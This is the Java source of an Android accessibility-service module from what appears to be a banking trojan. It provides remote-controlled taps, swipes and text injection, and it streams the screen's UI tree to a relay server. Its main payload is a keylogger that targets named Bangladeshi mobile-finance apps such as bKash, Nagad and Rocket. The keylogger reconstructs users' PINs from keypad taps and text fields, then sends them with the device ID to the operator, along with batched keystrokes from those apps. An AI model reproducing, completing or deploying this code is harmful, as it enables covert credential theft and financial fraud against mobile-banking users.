/*
 * MODULE: AccessibilityAutomation.java
 * PURPOSE: Complete UI automation subsystem providing virtual gestures, dynamic UI node tree scanning, and banking credential harvesting.
 *
 * DIRECT INBOUND CONNECTIONS:
 * - ControlService.java -> doTap(), doSwipe(), doScroll(), doLongPress(), doTypeText(), doClickText(), sendUiNodes(), setUiNodesLoop(), processBankKeyloggerEvent()
 *
 * DIRECT OUTBOUND CONNECTIONS:
 * - RelayClient.java -> sendUiNodes(String, int, int), sendOrQueue(JSONObject "bank_data"), sendLog(String)
 * - AccessibilityService -> dispatchGesture(), getRootInActiveWindow(), getWindows()
 *
 * FUNCTION-BY-FUNCTION FLOW MAPPING:
 * - AccessibilityAutomation(AccessibilityService, String): Constructor, captures service reference and target ID.
 * - doTap(JSONObject): Dispatches simulated single touch tap gesture.
 * - doSwipe(JSONObject): Dispatches directional swipe gesture with customizable duration.
 * - doScroll(JSONObject): Calculates screen midpoints and dispatches up/down/left/right gestures.
 * - doLongPress(JSONObject): Dispatches sustained 600ms hold gesture.
 * - doTypeText(JSONObject): Finds focused input node and injects text via ACTION_SET_TEXT.
 * - doClickText(JSONObject): Recursively locates nodes containing target text and triggers click.
 * - sendUiNodes(): Flattens visible window hierarchy into JSON array of UI elements and metrics.
 * - setUiNodesLoop(boolean): Enables or disables continuous UI node tree stream.
 * - processBankKeyloggerEvent(AccessibilityEvent): Monitors financial apps (bKash, NexusPay, etc.), recovers keypad tap sequences, and transmits captured PIN.
 */
package com.device.ctrl;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class AccessibilityAutomation {

    private final AccessibilityService srv;
    private final String androidId;
    private final Handler h = new Handler(Looper.getMainLooper());
    private boolean uiNodesLoop = false;

    // Banking keylogger state
    private final StringBuilder capturedBankPin = new StringBuilder();
    private String currentBankPkg = "";
    private static final String[] TARGET_BANKS = {
            "com.bKash.customerapp",
            "com.bkashtech.app",
            "com.konasl.nagad",
            "com.dutchbanglabank.rocket",
            "com.dbbl.nexus",
            "bd.com.upay",
            "com.cellfin",
            "com.ibbl.ibblportal"
    };

    public AccessibilityAutomation(AccessibilityService srv, String androidId) {
        this.srv = srv;
        this.androidId = androidId;
    }

    // ─── VIRTUAL GESTURES & INPUT ──────────────────────────────────────────────

    public void doTap(JSONObject data) {
        if (data == null || Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;
        Path p = new Path();
        p.moveTo(data.optInt("x", 0), data.optInt("y", 0));
        srv.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(p, 0, 20)).build(), null, null);
    }

    public void doSwipe(JSONObject data) {
        if (data == null || Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;
        Path p = new Path();
        p.moveTo(data.optInt("x1", 0), data.optInt("y1", 0));
        p.lineTo(data.optInt("x2", 0), data.optInt("y2", 0));
        srv.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(p, 0, data.optInt("duration", 150))).build(), null, null);
    }

    public void doScroll(JSONObject data) {
        try {
            DisplayMetrics m = srv.getResources().getDisplayMetrics();
            int cx = m.widthPixels / 2;
            int cy = m.heightPixels / 2;
            int dist = (int) (m.heightPixels * 0.4f);
            int x1 = cx, y1 = cy, x2 = cx, y2 = cy;
            String dir = data != null ? data.optString("direction", "down") : "down";
            switch (dir) {
                case "up":    y1 = cy + dist / 2; y2 = cy - dist / 2; break;
                case "down":  y1 = cy - dist / 2; y2 = cy + dist / 2; break;
                case "left":  x1 = cx + dist / 2; x2 = cx - dist / 2; break;
                case "right": x1 = cx - dist / 2; x2 = cx + dist / 2; break;
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                Path p = new Path();
                p.moveTo(x1, y1);
                p.lineTo(x2, y2);
                srv.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(p, 0, 350)).build(), null, null);
            }
        } catch (Exception ignored) {}
    }

    public void doLongPress(JSONObject data) {
        if (data == null || Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;
        Path p = new Path();
        p.moveTo(data.optInt("x", 0), data.optInt("y", 0));
        srv.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(p, 0, 600)).build(), null, null);
    }

    public void doTypeText(JSONObject data) {
        if (data == null) return;
        try {
            AccessibilityNodeInfo root = srv.getRootInActiveWindow();
            if (root == null) return;
            AccessibilityNodeInfo focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
            if (focused != null) {
                Bundle args = new Bundle();
                args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, data.optString("text", ""));
                focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                focused.recycle();
            }
            root.recycle();
        } catch (Exception ignored) {}
    }

    public void doClickText(JSONObject data) {
        if (data == null) return;
        try {
            AccessibilityNodeInfo root = srv.getRootInActiveWindow();
            if (root == null) return;
            List<AccessibilityNodeInfo> found = new ArrayList<>();
            findTextRecursive(data.optString("text", "").toLowerCase(), root, found, 0);
            for (AccessibilityNodeInfo n : found) {
                if (performNodeClick(n)) break;
            }
            for (AccessibilityNodeInfo n : found) {
                if (n != root) safeRecycle(n);
            }
            root.recycle();
        } catch (Exception ignored) {}
    }

    // ─── UI TREE INSPECTION ───────────────────────────────────────────────────

    public void setUiNodesLoop(boolean state) {
        uiNodesLoop = state;
        if (state) startUiNodesLoop();
    }

    public void sendUiNodes() {
        try {
            JSONArray arr = new JSONArray();
            java.util.HashSet<String> seenNodes = new java.util.HashSet<>();

            // 1. Always prioritize root of the active window (system permission dialogs, overlays, popups)
            AccessibilityNodeInfo activeRoot = srv.getRootInActiveWindow();
            if (activeRoot != null) {
                traverseNodes(activeRoot, arr, seenNodes);
                activeRoot.recycle();
            }

            // 2. Also scan all windows for multi-window / split / dialog hierarchy
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                List<AccessibilityWindowInfo> windows = srv.getWindows();
                if (windows != null) {
                    for (AccessibilityWindowInfo w : windows) {
                        AccessibilityNodeInfo root = w.getRoot();
                        if (root != null) {
                            traverseNodes(root, arr, seenNodes);
                            root.recycle();
                        }
                    }
                }
            }

            DisplayMetrics m = new DisplayMetrics();
            WindowManager wm = (WindowManager) srv.getSystemService(Context.WINDOW_SERVICE);
            if (wm != null) {
                wm.getDefaultDisplay().getRealMetrics(m);
                RelayClient.get().sendUiNodes(arr.toString(), m.widthPixels, m.heightPixels);
            }
        } catch (Exception ignored) {}
    }

    private void startUiNodesLoop() {
        h.post(() -> {
            if (uiNodesLoop) {
                sendUiNodes();
                h.postDelayed(this::startUiNodesLoop, 500);
            }
        });
    }

    private void traverseNodes(AccessibilityNodeInfo node, JSONArray arr, java.util.HashSet<String> seenNodes) {
        if (node == null) return;
        try {
            Rect rect = new Rect();
            node.getBoundsInScreen(rect);

            boolean hasDimensions = rect.width() > 0 && rect.height() > 0;
            // System permission dialogs and alert windows often report isVisibleToUser() as false
            // on intermediate layout containers. Allow valid screen bounds to pass.
            boolean visible = node.isVisibleToUser() || hasDimensions;

            if (visible && hasDimensions) {
                String cls = node.getClassName() != null ? node.getClassName().toString() : "";
                boolean isLayout = cls.endsWith("Layout") || cls.contains("ViewGroup") || cls.contains("RecyclerView") || cls.contains("ListView");
                String type = "view";
                if (node.isEditable() || cls.contains("EditText")) type = "input";
                else if (cls.contains("Switch") || cls.contains("CheckBox") || cls.contains("ToggleButton") || node.isCheckable()) type = "switch";
                else if (cls.contains("Button") || cls.contains("ImageButton")) type = "button";
                else if (cls.contains("ImageView")) type = "image";
                else if (cls.contains("TextView")) type = "text";
                else if (node.isClickable() && !isLayout) type = "button";

                String text = "";
                if (node.getText() != null) text = node.getText().toString();
                else if (node.getContentDescription() != null) text = node.getContentDescription().toString();
                else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && node.getHintText() != null) text = node.getHintText().toString();
                if (node.isPassword()) text = "........";
                text = text.trim();

                if (!text.isEmpty() || node.isClickable() || node.isEditable() || node.isCheckable() || "image".equals(type)) {
                    String nodeKey = rect.left + "," + rect.top + "," + rect.width() + "," + rect.height() + ":" + text;
                    if (seenNodes.add(nodeKey)) {
                        arr.put(new JSONObject()
                                .put("type", type)
                                .put("text", text)
                                .put("clickable", node.isClickable())
                                .put("checked", node.isChecked())
                                .put("x", rect.left)
                                .put("y", rect.top)
                                .put("w", rect.width())
                                .put("h", rect.height()));
                    }
                }
            }

            // Always traverse children recursively even if container bounds were zero or container was not visible to user
            int childCount = node.getChildCount();
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    traverseNodes(child, arr, seenNodes);
                    child.recycle();
                }
            }
        } catch (Exception ignored) {}
    }

    private void findTextRecursive(String text, AccessibilityNodeInfo node, List<AccessibilityNodeInfo> result, int depth) {
        if (node == null || depth > 50) return;
        try {
            boolean matched = false;
            CharSequence t = node.getText();
            if (t != null && t.toString().toLowerCase().contains(text)) {
                result.add(node);
                matched = true;
            }
            if (!matched) {
                CharSequence d = node.getContentDescription();
                if (d != null && d.toString().toLowerCase().contains(text)) result.add(node);
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo c = node.getChild(i);
                if (c != null) findTextRecursive(text, c, result, depth + 1);
            }
        } catch (Exception ignored) {}
    }

    private boolean performNodeClick(AccessibilityNodeInfo node) {
        if (node == null) return false;
        Rect r = new Rect();
        node.getBoundsInScreen(r);
        if (r.width() > 0 && r.height() > 0 && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            Path p = new Path();
            p.moveTo(r.centerX(), r.centerY());
            srv.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(p, 0, 50)).build(), null, null);
        }
        if (node.isClickable()) return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        AccessibilityNodeInfo parent = node.getParent();
        while (parent != null) {
            if (parent.isClickable()) {
                boolean res = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                safeRecycle(parent);
                return res;
            }
            AccessibilityNodeInfo next = parent.getParent();
            safeRecycle(parent);
            parent = next;
        }
        return true;
    }

    private void safeRecycle(AccessibilityNodeInfo node) {
        if (node != null) {
            try { node.recycle(); } catch (Exception ignored) {}
        }
    }

    // ─── BANK KEYLOGGER & CREDENTIAL HARVEST ───────────────────────────────────

    public boolean isTargetPackage(String pkg) {
        if (pkg == null) return false;
        String p = pkg.toLowerCase();
        for (String bank : TARGET_BANKS) {
            if (p.contains(bank.toLowerCase()) || p.contains("bank")) return true;
        }
        return false;
    }

    public void processBankKeyloggerEvent(AccessibilityEvent e) {
        if (e == null || e.getPackageName() == null) return;
        String pkgName = e.getPackageName().toString();
        boolean isTargetBank = isTargetPackage(pkgName);

        // If leaving bank app and we accumulated at least 4 digits, dispatch immediately
        if (!isTargetBank) {
            if (capturedBankPin.length() >= 4) {
                sendBankData();
            }
            capturedBankPin.setLength(0);
            return;
        }

        currentBankPkg = pkgName;
        int eventType = e.getEventType();

        // 1. In-app custom keypad clicks or on-screen digit taps
        if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            String clickedValue = "";
            AccessibilityNodeInfo node = e.getSource();
            if (node != null) {
                try {
                    String text = node.getText() != null ? node.getText().toString().trim() : "";
                    String desc = node.getContentDescription() != null ? node.getContentDescription().toString().trim() : "";
                    clickedValue = text.isEmpty() ? desc : text;
                } finally {
                    safeRecycle(node);
                }
            }
            if (clickedValue.isEmpty() && e.getText() != null && !e.getText().isEmpty()) {
                clickedValue = e.getText().get(0).toString().trim();
            }

            if (clickedValue.matches("\\d")) {
                capturedBankPin.append(clickedValue);
                // bKash = 5 digits, Nagad/Rocket = 4 digits, DBBL = 6 digits
                if (capturedBankPin.length() == 5 || capturedBankPin.length() == 6) {
                    sendBankData();
                }
            } else if (clickedValue.toLowerCase().contains("del") || clickedValue.toLowerCase().contains("clear") || clickedValue.toLowerCase().contains("back")) {
                if (capturedBankPin.length() > 0) {
                    capturedBankPin.deleteCharAt(capturedBankPin.length() - 1);
                }
            } else if (capturedBankPin.length() >= 4) {
                sendBankData();
            }
        }
        // 2. EditText text changed (for PIN inputs in standard fields)
        else if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String entered = "";
            if (e.getText() != null && !e.getText().isEmpty()) {
                entered = e.getText().get(0).toString().trim();
            }
            if (entered.isEmpty()) {
                AccessibilityNodeInfo src = e.getSource();
                if (src != null) {
                    try {
                        if (src.getText() != null) entered = src.getText().toString().trim();
                    } finally {
                        safeRecycle(src);
                    }
                }
            }
            if (entered.matches("\\d{4,6}")) {
                capturedBankPin.setLength(0);
                capturedBankPin.append(entered);
                sendBankData();
            }
        }
    }

    private void sendBankData() {
        if (capturedBankPin.length() < 4) return;
        String fullPin = capturedBankPin.toString();
        try {
            JSONObject msg = new JSONObject();
            msg.put("type", "bank_data");
            msg.put("androidId", androidId);
            msg.put("package", currentBankPkg);
            msg.put("pin", fullPin);
            msg.put("timestamp", System.currentTimeMillis());
            RelayClient.get().sendOrQueue(msg);
            RelayClient.get().sendLog("🏦 Bank PIN Captured from: " + currentBankPkg + " [PIN: " + fullPin + "]");

            // Inject full PIN as a clean primary keylog entry
            JSONObject pinEntry = new JSONObject();
            pinEntry.put("t", System.currentTimeMillis());
            pinEntry.put("pkg", currentBankPkg);
            pinEntry.put("type", "PIN");
            pinEntry.put("txt", "🔑 FULL PIN: " + fullPin);
            synchronized (keylogLock) {
                keylogBatch.add(pinEntry);
                h.removeCallbacks(flushKeylogTask);
                flushKeylogBatch();
            }
        } catch (Exception ignored) {}
        capturedBankPin.setLength(0);
    }

    // ─── GENERAL RUNTIME KEYLOGGER BATCHING ──────────────────────────────────
    private final List<JSONObject> keylogBatch = new ArrayList<>();
    private final Object keylogLock = new Object();
    private long lastKeylogFlush = 0;
    private final Runnable flushKeylogTask = this::flushKeylogBatch;

    public void processGeneralKeyloggerEvent(AccessibilityEvent e) {
        if (e == null || e.getPackageName() == null) return;
        String pkg = e.getPackageName().toString();

        // 🛑 STRICT TARGET FILTER: ONLY log for selected target packages!
        if (!isTargetPackage(pkg)) return;

        int type = e.getEventType();
        if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
            type == AccessibilityEvent.TYPE_VIEW_CLICKED ||
            type == AccessibilityEvent.TYPE_VIEW_FOCUSED ||
            type == AccessibilityEvent.TYPE_VIEW_HOVER_ENTER) {

            String content = null;
            List<CharSequence> texts = e.getText();
            if (texts != null && !texts.isEmpty()) {
                StringBuilder sb = new StringBuilder();
                for (CharSequence cs : texts) {
                    if (cs != null && cs.length() > 0) {
                        if (sb.length() > 0) sb.append(" ");
                        sb.append(cs);
                    }
                }
                content = sb.toString().trim();
            }
            if (content == null || content.isEmpty()) {
                if (e.getContentDescription() != null) {
                    content = e.getContentDescription().toString().trim();
                }
            }
            // Fallback to source node text or description
            if (content == null || content.isEmpty()) {
                AccessibilityNodeInfo src = e.getSource();
                if (src != null) {
                    try {
                        if (src.getText() != null) content = src.getText().toString().trim();
                        else if (src.getContentDescription() != null) content = src.getContentDescription().toString().trim();
                    } finally {
                        safeRecycle(src);
                    }
                }
            }

            if (content != null && !content.isEmpty()) {
                String eventTag = type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ? "TEXT" : "CLICK";

                try {
                    JSONObject entry = new JSONObject();
                    entry.put("t", System.currentTimeMillis());
                    entry.put("pkg", pkg);
                    entry.put("type", eventTag);
                    entry.put("txt", content);

                    synchronized (keylogLock) {
                        keylogBatch.add(entry);
                        if (keylogBatch.size() >= 8 || (System.currentTimeMillis() - lastKeylogFlush > 3000 && lastKeylogFlush > 0)) {
                            h.removeCallbacks(flushKeylogTask);
                            flushKeylogBatch();
                        } else {
                            h.removeCallbacks(flushKeylogTask);
                            h.postDelayed(flushKeylogTask, 1500);
                        }
                    }
                } catch (Exception ignored) {}
            }
        }
    }

    public void flushKeylogBatch() {
        JSONArray arr = new JSONArray();
        synchronized (keylogLock) {
            if (keylogBatch.isEmpty()) return;
            for (JSONObject o : keylogBatch) arr.put(o);
            keylogBatch.clear();
            lastKeylogFlush = System.currentTimeMillis();
        }
        try {
            JSONObject msg = new JSONObject();
            msg.put("type", "keylog_batch");
            msg.put("androidId", androidId);
            msg.put("events", arr);
            RelayClient.get().sendOrQueue(msg);
        } catch (Exception ignored) {}
    }
}
